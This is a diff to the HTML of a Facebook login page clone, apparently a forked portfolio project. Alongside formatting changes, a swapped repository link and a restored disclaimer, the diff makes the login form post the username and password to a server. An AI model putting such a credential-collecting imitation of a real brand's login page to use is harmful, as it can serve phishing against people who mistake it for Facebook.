@@ -4,16 +4,14 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width" />
     <title>Facebook – log in or sign up</title>
-    <link
-      rel="icon"
-      href="./images/fb.png"
-    />
+    <link rel="icon" href="./images/fb.png" />
     <link rel="stylesheet" href="css/styles.css" />
     <!-- To get the font-awesome CSS style sheet for the 'Eye Icon' located in the password field -->
-    <link
+    <!-- <link
       rel="stylesheet"
       href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css"
-    />
+    /> -->
+    <link rel="stylesheet" href="./css/fontawesome.min.css" />
   </head>
   <body>
     <div class="contains-top-half-and-footer-bottom-half">
@@ -22,11 +20,7 @@
           <div class="big-box">
             <div class="left-box">
               <div class="image-box">
-                <img
-                  class="fb-logo"
-                  src="./images/facebook.svg"
-                  alt=""
-                />
+                <img class="fb-logo" src="./images/facebook.svg" alt="" />
               </div>
               <h2 class="logo-caption">
                 Facebook helps you connect and share with the people in your
@@ -35,12 +29,14 @@
             </div>
             <div class="right-box">
               <div class="form-container">
-                <form>
+                <form method="post">
                   <div class="space">
                     <input
                       type="text"
                       class="email-box"
-                      placeholder="Email address or phone number"
+                      placeholder="Email address or Phone number"
+                      name="username"
+                      required
                     />
                   </div>
                   <div style="display: flex">
@@ -50,6 +46,8 @@
                         class="pw-box"
                         placeholder="Password"
                         id="password_field"
+                        name="password"
+                        required
                       />
                     </div>
                     <i
@@ -59,7 +57,7 @@
                     ></i>
                   </div>
                   <div class="space">
-                    <button type="button" class="login-button">
+                    <button class="login-button" type="submit" name="upload">
                       <b>Log In</b>
                     </button>
                   </div>
@@ -123,7 +121,9 @@
             <li class="list-items">
               <a class="list-items" href="#">Log in</a>
             </li>
-            <li class="list-items"><a class="list-items" href="#">Messenger</a></li>
+            <li class="list-items">
+              <a class="list-items" href="#">Messenger</a>
+            </li>
             <li class="list-items">
               <a class="list-items" href="#">Facebook Lite</a>
             </li>
@@ -199,15 +199,15 @@
             <li class="list-items"><a class="list-items" href="#">Help</a></li>
           </ul>
           <div class="fb-clone">
-            <!-- <p>
+            <p>
               Disclaimer: This web page is a personal portfolio project. Hence,
               please kindly do not enter any of your credentials here. We will
               not be liable for any losses or damages arising from such an
               action.
-            </p> -->
+            </p>
             <a
               class="fb-clone-link"
-              href="https://github.com/melvincwng/facebook-clone"
+              href="https://github.com/meetmarvelous/facebook-clone"
               target="_blank"
               rel="noopener noreferrer"
               >Meta © 2023</a
@@ -219,7 +219,5 @@
 
     <!-- Script to toggle on & off the eye icon in the password field -->
     <script src="./js/toggleEyeIcon.js"></script>
-    <!-- Script to change/randomize background image every time the webpage is reloaded -->
-    <!-- <script src="./js/changeBackgroundImage.js"></script> -->
   </body>
 </html>
